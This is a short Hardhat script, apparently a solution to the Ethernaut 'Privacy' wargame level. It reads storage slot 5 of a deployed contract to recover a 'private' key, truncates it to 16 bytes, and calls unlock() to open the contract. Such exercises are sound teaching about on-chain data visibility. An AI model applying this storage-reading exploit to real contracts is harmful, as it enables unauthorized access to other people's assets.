const hre = require("hardhat");
const { web3 } = require("hardhat");

async function main() {
  const privacyContractAddr = "0x96C75dcFB98f544A17143d61069Faa3C177F0797";
  const Privacy = await hre.ethers.getContractFactory("Privacy");

  const privacy = await Privacy.attach(privacyContractAddr);

  const b32Key = await web3.eth.getStorageAt(privacyContractAddr, 5);
  console.log("Key:", b32Key);

  console.log("LOCKED:", await privacy.locked());
  await privacy.unlock("0x" + b32Key.slice(2, 34));
  console.log("LOCKED:", await privacy.locked());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
